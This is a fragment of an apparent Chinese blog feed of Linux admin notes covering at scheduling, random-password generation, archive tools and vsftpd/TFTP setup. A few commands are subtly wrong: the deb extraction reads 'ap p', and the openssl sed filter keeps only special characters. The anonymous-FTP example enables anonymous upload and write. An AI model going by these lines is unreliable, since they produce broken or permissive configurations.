class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># &#x4E09;&#x5929;&#x540E;&#x7684;&#x4E0B;&#x5348;5&#x70B9;&#x949F;&#x6267;&#x884C;/bin/ls</span></span><br><span class="line">at 5pm+3 days</span><br><span class="line">at&gt; /bin/ls</span><br><span class="line">at&gt; &lt;EOT&gt;</span><br><span class="line">Ctrl+D</span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x660E;&#x5929;17&#x70B9;&#x949F;&#xFF0C;&#x8F93;&#x51FA;&#x65F6;&#x95F4;&#x5230;&#x6307;&#x5B9A;&#x6587;&#x4EF6;&#x5185;&#xFF1A;</span></span><br><span class="line">at 17:20 tomorrow</span><br><span class="line">at&gt; date &gt;/root/2022.log</span><br><span class="line">at&gt; &lt;EOT&gt;</span><br><span class="line">Ctrl+D</span><br></pre></td></tr></tbody></table></figure><p><strong>atq &#x67E5;&#x770B;&#x7CFB;&#x7EDF;&#x6267;&#x884C;&#x5DE5;&#x4F5C;&#x4EFB;&#x52A1;</strong></p><p><strong>atrm x &#x5220;&#x9664;&#x4EFB;&#x52A1;x</strong></p><p><strong>at -c x &#x67E5;&#x770B;&#x5DF2;&#x7ECF;&#x8BBE;&#x7F6E;&#x7684;&#x4EFB;&#x52A1;&#x5185;&#x5BB9;</strong></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;crontab&quot;&gt;&lt;a href=&quot;#crontab&quot; class=&quot;headerlink&quot; title=&quot;crontab&quot;&gt;&lt;/a&gt;crontab&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;&amp;#x63D0;&amp;#x4EA4;&amp;#x548C;&amp;#x7BA1;&amp;#x74
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Linux登录退出提示信息欢迎信息</title>
    <link href="https://marnm.github.io//posts/e025952a/"/>
    <id>https://marnm.github.io//posts/e025952a/</id>
    <published>2022-06-07T04:37:10.000Z</published>
    <updated>2022-06-07T04:56:53.599Z</updated>
    
    <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script&gt;
        document.querySelectorAll(&#39;.github-emoji&#39;)
          .forEach(el =&gt; {
            if (!el.dataset.src) { return; }
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Linux生成随机密码方法</title>
    <link href="https://marnm.github.io//posts/b3f64b7d/"/>
    <id>https://marnm.github.io//posts/b3f64b7d/</id>
    <published>2022-06-07T04:36:47.000Z</published>
    <updated>2022-06-07T05:23:31.254Z</updated>
    
    <content type="html"><![CDATA[<hr><h3 id="gpg&#x751F;&#x6210;&#x968F;&#x673A;&#x5B57;&#x7B26;"><a href="#gpg&#x751F;&#x6210;&#x968F;&#x673A;&#x5B57;&#x7B26;" class="headerlink" title="gpg&#x751F;&#x6210;&#x968F;&#x673A;&#x5B57;&#x7B26;"></a>gpg&#x751F;&#x6210;&#x968F;&#x673A;&#x5B57;&#x7B26;</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># </span></span><br><span class="line">gpg --gen-random --armor 2 12</span><br><span class="line"><span class="comment"># --gen-random &#x968F;&#x673A;&#x751F;&#x6210;&#x5B57;&#x7B26;</span></span><br><span class="line"><span class="comment"># -armor &#x751F;&#x6210;ASCII&#x5B57;&#x7B26;</span></span><br><span class="line"><span class="comment"># 2 &#x8D28;&#x91CF;&#x7EA7;&#x522B;&#xFF0C;0&#x3001;1&#x3001;2&#x4E09;&#x4E2A;&#x9009;&#x9879;</span></span><br><span class="line"><span class="comment"># 12    &#x5B57;&#x7B26;&#x957F;&#x5EA6;</span></span><br></pre></td></tr></tbody></table></figure><p><strong>&#x8FC7;&#x6EE4;&#x7279;&#x6B8A;&#x5B57;&#x7B26;</strong><br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpg --gen-random --armor 2 12 | sed <span class="string">&apos;s/[^a-zA-Z0-9]//g&apos;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>&#x68C0;&#x6D4B;&#x5BC6;&#x7801;&#x5F3A;&#x5EA6;</strong></p><blockquote><p>&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x5B89;&#x88C5;<code>cracklib</code>&#x5DE5;&#x5177;&#x6765;&#x68C0;&#x67E5;&#x5BC6;&#x7801;&#x5F3A;&#x5EA6;</p></blockquote><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">yum install cracklib</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;123545&quot;</span> | cracklib-check</span><br></pre></td></tr></tbody></table></figure><h3 id="openssl&#x751F;&#x6210;&#x968F;&#x673A;&#x5B57;&#x7B26;"><a href="#openssl&#x751F;&#x6210;&#x968F;&#x673A;&#x5B57;&#x7B26;" class="headerlink" title="openssl&#x751F;&#x6210;&#x968F;&#x673A;&#x5B57;&#x7B26;"></a>openssl&#x751F;&#x6210;&#x968F;&#x673A;&#x5B57;&#x7B26;</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl rand -base64 15</span><br></pre></td></tr></tbody></table></figure><p><strong>&#x8FC7;&#x6EE4;&#x7279;&#x6B8A;&#x5B57;&#x7B26;</strong><br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl rand -base64 15 | sed <span class="string">&apos;s/[a-zA-Z0-9]//g&apos;</span></span><br></pre></td></tr></tbody></table></figure><p></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;hr&gt;
&lt;h3 id=&quot;gpg&amp;#x751F;&amp;#x6210;&amp;#x968F;&amp;#x673A;&amp;#x5B57;&amp;#x7B26;&quot;&gt;&lt;a href=&quot;#gpg&amp;#x751F;&amp;#x6210;&amp;#x968F;&amp;#x673A;&amp;#x5B57;&amp;#x7B26;&quot; class=&quot;head
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Linux的归档与解压缩</title>
    <link href="https://marnm.github.io//posts/1e844aa4/"/>
    <id>https://marnm.github.io//posts/1e844aa4/</id>
    <published>2022-06-07T04:36:30.000Z</published>
    <updated>2022-06-07T05:23:56.633Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Linux&#x89E3;&#x538B;&#x7F29;&#x5DE5;&#x5177;&#xFF08;&#x547D;&#x4EE4;&#xFF09;"><a href="#Linux&#x89E3;&#x538B;&#x7F29;&#x5DE5;&#x5177;&#xFF08;&#x547D;&#x4EE4;&#xFF09;" class="headerlink" title="Linux&#x89E3;&#x538B;&#x7F29;&#x5DE5;&#x5177;&#xFF08;&#x547D;&#x4EE4;&#xFF09;"></a>Linux&#x89E3;&#x538B;&#x7F29;&#x5DE5;&#x5177;&#xFF08;&#x547D;&#x4EE4;&#xFF09;</h3><blockquote><p>tar &#x3001;gzip&#x3001;bzip2&#x3001;zip&#x3001;xz&#x3001;gunzip&#x3001;</p></blockquote><h3 id="tar"><a href="#tar" class="headerlink" title="tar"></a>tar</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-c &#x521B;&#x5EFA;&#x6253;&#x5305;</span><br><span class="line">-x &#x5C55;&#x5F00;&#x5F52;&#x6863;&#x6587;&#x4EF6;</span><br><span class="line">-v &#x663E;&#x793A;&#x8FC7;&#x7A0B;&#x4FE1;&#x606F;</span><br><span class="line">-f &#x6307;&#x5B9A;&#x6587;&#x4EF6;/&#x76EE;&#x5F55;</span><br><span class="line">-O &#x5C06;&#x6587;&#x4EF6;&#x89E3;&#x5F00;&#x5230;&#x6807;&#x51C6;&#x8F93;&#x51FA;</span><br><span class="line">-C &#x6307;&#x5B9A;&#x8DEF;&#x5F84;</span><br><span class="line">-j bz2&#x683C;&#x5F0F;&#x6587;&#x4EF6;</span><br><span class="line">-J xz&#x683C;&#x5F0F;&#x6587;&#x4EF6;</span><br><span class="line">-z gzip&#x683C;&#x5F0F;&#x6587;&#x4EF6;</span><br></pre></td></tr></tbody></table></figure><blockquote><p>&#x89E3;&#x5305;&#xFF1A;tar -xvf filename.tar<br>&#x6253;&#x5305;&#xFF1A;tar -cvf filename.tar</p></blockquote><h3 id="gzip&#x683C;&#x5F0F;&#x6587;&#x4EF6;"><a href="#gzip&#x683C;&#x5F0F;&#x6587;&#x4EF6;" class="headerlink" title="gzip&#x683C;&#x5F0F;&#x6587;&#x4EF6;"></a>gzip&#x683C;&#x5F0F;&#x6587;&#x4EF6;</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf filename.tar.gz   <span class="comment"># &#x89E3;&#x538B;gzip&#x683C;&#x5F0F;&#x538B;&#x7F29;&#x6587;&#x4EF6;</span></span><br><span class="line">tar -zcvf filename.tar.gz compress_dir  <span class="comment"># &#x521B;&#x5EFA;gzip&#x683C;&#x5F0F;&#x538B;&#x7F29;&#x6587;&#x4EF6;</span></span><br><span class="line"><span class="comment">################################33</span></span><br><span class="line">gunzip filename.gz  <span class="comment"># &#x89E3;&#x538B;gzip&#x683C;&#x5F0F;&#x6587;&#x4EF6;</span></span><br><span class="line">gzip -d filename.gz <span class="comment"># &#x89E3;&#x538B;gzip&#x683C;&#x5F0F;&#x6587;&#x4EF6;</span></span><br><span class="line">gzip filename.gz    <span class="comment"># &#x521B;&#x5EFA;gzip&#x683C;&#x5F0F;&#x6587;&#x4EF6;</span></span><br></pre></td></tr></tbody></table></figure><h3 id="bz"><a href="#bz" class="headerlink" title="bz"></a>bz</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bzip2 -d filename.bz    <span class="comment"># &#x89E3;&#x538B;bz&#x683C;&#x5F0F;&#x6587;&#x4EF6;</span></span><br><span class="line">bunzip2 filename.bz     <span class="comment"># &#x89E3;&#x538B;bz&#x683C;&#x5F0F;&#x6587;&#x4EF6;</span></span><br><span class="line"><span class="comment">################3</span></span><br><span class="line">tar jxvf    <span class="comment"># &#x89E3;&#x538B;bz&#x683C;&#x5F0F;&#x6587;&#x4EF6;</span></span><br></pre></td></tr></tbody></table></figure><h3 id="bz2"><a href="#bz2" class="headerlink" title="bz2"></a>bz2</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bzip2 -d filename.bz2   <span class="comment"># &#x89E3;&#x538B;bz2&#x683C;&#x5F0F;&#x6587;&#x4EF6;</span></span><br><span class="line">bunzip2 filename.bz2    <span class="comment"># &#x89E3;&#x538B;bz2&#x683C;&#x5F0F;&#x6587;&#x4EF6;</span></span><br><span class="line">bzip2 -z filename   <span class="comment"># &#x521B;&#x5EFA;bz2&#x683C;&#x5F0F;&#x6587;&#x4EF6;</span></span><br><span class="line"><span class="comment">####################</span></span><br><span class="line">tar jxvf filename.tar.bz2   <span class="comment"># &#x89E3;&#x538B;bz2&#x683C;&#x5F0F;&#x6587;&#x4EF6;</span></span><br><span class="line">tar jcvf file_dir   <span class="comment"># &#x521B;&#x5EFA;bz2&#x683C;&#x5F0F;&#x6587;&#x4EF6;</span></span><br></pre></td></tr></tbody></table></figure><h3 id="z"><a href="#z" class="headerlink" title="z"></a>z</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">uncompress filename.z   <span class="comment"># &#x89E3;&#x538B;z&#x683C;&#x5F0F;&#x6587;&#x4EF6;</span></span><br><span class="line">compress    filename    <span class="comment"># &#x521B;&#x5EFA;z&#x683C;&#x5F0F;&#x6587;&#x4EF6;</span></span><br><span class="line"><span class="comment">##################</span></span><br><span class="line">tar Zxvf    <span class="comment"># &#x89E3;&#x538B;z&#x683C;&#x5F0F;&#x6587;&#x4EF6;</span></span><br><span class="line">tar Zcvf    <span class="comment"># &#x521B;&#x5EFA;z&#x683C;&#x5F0F;&#x6587;&#x4EF6;</span></span><br></pre></td></tr></tbody></table></figure><h3 id="zip"><a href="#zip" class="headerlink" title="zip"></a>zip</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">unzip filename.zip  <span class="comment"># &#x89E3;&#x538B;zip&#x6587;&#x4EF6;</span></span><br><span class="line">zip filename.zip file_dir   <span class="comment"># &#x521B;&#x5EFA;zip&#x6587;&#x4EF6;</span></span><br></pre></td></tr></tbody></table></figure><h3 id="rpm&#x5305;&#x7684;&#x89E3;&#x5305;"><a href="#rpm&#x5305;&#x7684;&#x89E3;&#x5305;" class="headerlink" title="rpm&#x5305;&#x7684;&#x89E3;&#x5305;"></a>rpm&#x5305;&#x7684;&#x89E3;&#x5305;</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpm2cpio filename.rpm | cpio -div</span><br></pre></td></tr></tbody></table></figure><h3 id="deb&#x5305;&#x7684;&#x89E3;&#x5305;"><a href="#deb&#x5305;&#x7684;&#x89E3;&#x5305;" class="headerlink" title="deb&#x5305;&#x7684;&#x89E3;&#x5305;"></a>deb&#x5305;&#x7684;&#x89E3;&#x5305;</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ap p filename.deb data.tar.gz | tar zxvf -</span><br></pre></td></tr></tbody></table></figure><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;Linux&amp;#x89E3;&amp;#x538B;&amp;#x7F29;&amp;#x5DE5;&amp;#x5177;&amp;#xFF08;&amp;#x547D;&amp;#x4EE4;&amp;#xFF09;&quot;&gt;&lt;a href=&quot;#Linux&amp;#x89E3;&amp;#x538B;&amp;#x7F29;&amp;#x5DE5;&amp;#x517
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Linux命令</title>
    <link href="https://marnm.github.io//posts/82734d8/"/>
    <id>https://marnm.github.io//posts/82734d8/</id>
    <published>2022-06-07T04:36:17.000Z</published>
    <updated>2022-06-07T04:56:53.587Z</updated>
    
    <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script&gt;
        document.querySelectorAll(&#39;.github-emoji&#39;)
          .forEach(el =&gt; {
            if (!el.dataset.src) { return; }
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>LDAP的配置与管理</title>
    <link href="https://marnm.github.io//posts/7733d98/"/>
    <id>https://marnm.github.io//posts/7733d98/</id>
    <published>2022-06-07T04:36:07.000Z</published>
    <updated>2022-06-07T04:56:53.585Z</updated>
    
    <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script&gt;
        document.querySelectorAll(&#39;.github-emoji&#39;)
          .forEach(el =&gt; {
            if (!el.dataset.src) { return; }
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>FTP/TFTP的配置与管理</title>
    <link href="https://marnm.github.io//posts/9d56e705/"/>
    <id>https://marnm.github.io//posts/9d56e705/</id>
    <published>2022-06-07T04:35:55.000Z</published>
    <updated>2022-06-07T05:24:31.402Z</updated>
    
    <content type="html"><![CDATA[<h2 id="TFTP"><a href="#TFTP" class="headerlink" title="TFTP"></a>TFTP</h2><blockquote><p>&#x7B80;&#x5355;&#x6587;&#x4EF6;&#x4F20;&#x8F93;&#x534F;&#x8BAE;</p></blockquote><p><strong>&#x5B89;&#x88C5;</strong><br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install tftp-server tftp xinetd</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>&#x914D;&#x7F6E;</strong><br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/xinetd.d/ftp</span><br><span class="line"><span class="built_in">disable</span> = no</span><br></pre></td></tr></tbody></table></figure><p></p><blockquote><p>tftp&#x670D;&#x52A1;&#x6587;&#x4EF6;&#x9ED8;&#x8BA4;&#x5B58;&#x653E;&#x76EE;&#x5F55;<br>/var/lib/tftpboot/</p></blockquote><h2 id="FTP-Server"><a href="#FTP-Server" class="headerlink" title="FTP Server"></a>FTP Server</h2><h3 id="&#x7B80;&#x5355;&#x914D;&#x7F6E;"><a href="#&#x7B80;&#x5355;&#x914D;&#x7F6E;" class="headerlink" title="&#x7B80;&#x5355;&#x914D;&#x7F6E;"></a>&#x7B80;&#x5355;&#x914D;&#x7F6E;</h3><blockquote><p><code>/etc/vsftpd/vsftpd.conf</code>  # ftp&#x4E3B;&#x8981;&#x914D;&#x7F6E;&#x6587;&#x4EF6;<br><code>/etc/vsftpd/ftpusers</code> # ftp&#x9ED1;&#x540D;&#x5355;<br><code>/etc/vsftpd/user_list</code> #&#x767D;&#x540D;&#x5355;<br><code>/var/ftp</code> ftp&#x9ED8;&#x8BA4;&#x6839;&#x76EE;&#x5F55;</p></blockquote><p><strong>&#x5B89;&#x88C5;</strong><br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install -y vsftp lftp</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>&#x533F;&#x540D;&#x8BBF;&#x95EE;FTP&#x914D;&#x7F6E;</strong><br>&#x793A;&#x4F8B;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># &#x542F;&#x7528;&#x533F;&#x540D;&#x8BBF;&#x95EE;</span></span><br><span class="line">anonymous_enable=YES</span><br><span class="line"><span class="comment"># &#x5141;&#x8BB8;&#x533F;&#x540D;&#x7528;&#x6237;&#x4E0A;&#x4F20;</span></span><br><span class="line">anon_upload_enable=YES</span><br><span class="line"><span class="comment"># &#x5141;&#x8BB8;&#x533F;&#x540D;&#x7528;&#x6237;&#x521B;&#x5EFA;&#x76EE;&#x5F55;</span></span><br><span class="line">anon_mkdir_write_enable=YES</span><br><span class="line"><span class="comment"># &#x5141;&#x8BB8;&#x533F;&#x540D;&#x7528;&#x6237;&#x4FEE;&#x6539;</span></span><br><span class="line">anon_other_write_enable=YES</span><br><span class="line">local_enable=YES</span><br><span class="line">write_enable=YES</span><br><span class="line">local_umask=022</span><br><span class="line">dirmessage_enable=YES</span><br><span class="line">xferlog_enable=YES</span><br><span class="line">connect_from_port_20=YES</span><br><span class="line">xferlog_std_format=YES</span><br><span class="line">listen=NO</span><br><span class="line">listen_ipv6=YES</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="&#x591A;&#x7528;&#x6237;FTP"><a href="#&#x591A;&#x7528;&#x6237;FTP" class="headerlink" title="&#x591A;&#x7528;&#x6237;FTP"></a><strong>&#x591A;&#x7528;&#x6237;FTP</strong></h3><blockquote><p>&#x5173;&#x95ED;&#x533F;&#x540D;&#x8BBF;&#x95EE;</p></blockquote><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/vsftpd/vsftpd.conf</span><br><span class="line">anonymous_enable=NO</span><br><span class="line">...</span><br><span class="line">anon_other_write_enable=NO</span><br></pre></td></tr></tbody></table></figure><blockquote><p>&#x6DFB;&#x52A0;FTP&#x7528;&#x6237;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">useradd -s /sbin/nologin ftp_user1</span><br><span class="line">useradd -s /sbin/nologin ftp_user2</span><br></pre></td></tr></tbody></table></figure><p></p></blockquote><blockquote><p>&#x4FEE;&#x6539;&#x914D;&#x7F6E;&#x6587;&#x4EF6;</p></blockquote><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/vsftpd/vsftpd.conf</span><br><span class="line"></span><br><span class="line">chroot_list_enable=YES</span><br><span class="line">chroot_list_file=/etc/vsftpd/chroot_list</span><br><span class="line">allow_writeable_chroot=YES</span><br><span class="line">local_enable=YES</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">touch /etc/vsftpd/chroot_list</span><br><span class="line">vim /etc/vsftpd/chroot_list</span><br><span class="line">ftp_user1</span><br><span class="line">ftp_user2</span><br></pre></td></tr></tbody></table></figure><p><strong>&#x793A;&#x4F8B;</strong><br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">anonymous_enable=NO</span><br><span class="line">anon_upload_enable=YES</span><br><span class="line">anon_mkdir_write_enable=YES</span><br><span class="line">anon_other_write_enable=NO</span><br><span class="line">local_root=/var/www/html</span><br><span class="line">chroot_list_enable=YES</span><br><span class="line">chroot_list_file=/etc/vsftpd/chroot_list</span><br><span class="line">allow_writeable_chroot=YES</span><br><span class="line">local_enable=YES</span><br><span class="line">local_umask=022</span><br><span class="line">write_enable=YES</span><br><span class="line">dirmessage_enable=YES</span><br><span class="line">xferlog_enable=YES</span><br><span class="line">connect_from_port_20=YES</span><br><span class="line">xferlog_std_format=YES</span><br><span class="line">listen=YES</span><br><span class="line"><span class="comment">#listen_ipv6=NO</span></span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="FTP&#x865A;&#x62DF;&#x7528;&#x6237;"><a href="#FTP&#x865A;&#x62DF;&#x7528;&#x6237;" class="headerlink" title="FTP&#x865A;&#x62DF;&#x7528;&#x6237;"></a>FTP&#x865A;&#x62DF;&#x7528;&#x6237;</h3><blockquote><p><a href="https://access.redhat.com/solutions/54295" target="_blank" rel="noopener">https://access.redhat.com/solutions/54295</a><br>&#x521B;&#x5EFA;FTP&#x767B;&#x5F55;&#x7528;&#x6237;</p></blockquote><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/vsftpd/login.txt</span><br><span class="line"></span><br><span class="line">user1</span><br><span class="line">user1_passwd</span><br><span class="line">user2</span><br><span class="line">user2_passwd</span><br></pre></td></tr></tbody></table></figure><blockquote><p>&#x5C06;&#x7528;&#x6237;&#x4FE1;&#x606F;&#x8F6C;&#x6362;&#x4E3A;&#x6570;&#x636E;&#x5E93;&#x6587;&#x4EF6;</p></blockquote><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db_load -T -t <span class="built_in">hash</span> -f /etc/vsftpd/login.txt /etc/vsftpd/login.db</span><br></pre></td></tr></tbody></table></figure><blockquote><p>&#x9700;&#x4FEE;&#x6539;&#x7528;&#x6237;&#x6570;&#x636E;&#x5E93;&#x7684;&#x6587;&#x4EF6;&#x6743;&#x9650;</p></blockquote><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 0600 /etc/vsftpd/login.db</span><br></pre></td></tr></tbody></table></figure><blockquote><p>&#x66F4;&#x65B0;vsftpd pam&#x914D;&#x7F6E;&#x6587;&#x4EF6;</p></blockquote><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/pam.d/vsftpd</span><br><span class="line"><span class="comment"># &#x5982;&#x679C;&#x4F60;&#x5141;&#x8BB8;ftp&#x865A;&#x62DF;yoghurt&#x8BBF;&#x95EE;&#xFF0C;&#x53EF;&#x4EE5;&#x628A;&#x5176;&#x5B83;&#x7684;&#x5185;&#x5BB9;&#x90FD;&#x6CE8;&#x91CA;&#x6389;</span></span><br><span class="line">auth        required    pam_userdb.so   db=/etc/vsftpd/login</span><br><span class="line">account    required   pam_userdb.so    db=/etc/vsftpd/login</span><br></pre></td></tr></tbody></table></figure><blockquote><p>&#x4E3A;&#x865A;&#x62DF;&#x7528;&#x6237;&#x521B;&#x5EFA;&#x4E3B;&#x76EE;&#x5F55;</p></blockquote><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir /home/ftp</span><br><span class="line">mkdir -p /home/ftp/{user1,user2}</span><br><span class="line">chown -R ftp:ftp /home/ftp</span><br></pre></td></tr></tbody></table></figure><blockquote><p><strong>&#x4FEE;&#x6539;vsftpd&#x914D;&#x7F6E;&#x6587;&#x4EF6;</strong></p></blockquote><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/vsftpd/vsftpd.conf</span><br><span class="line"><span class="comment"># &#x589E;&#x52A0;&#x5982;&#x4E0B;&#x53C2;&#x6570;</span></span><br><span class="line">guest_enable=YES</span><br><span class="line">guest_username=virtftp</span><br><span class="line">user_sub_token=<span class="variable">$USER</span></span><br><span class="line">local_root=/home/ftp/<span class="variable">$USER</span></span><br><span class="line">chroot_local_user=YES   <span class="comment"># 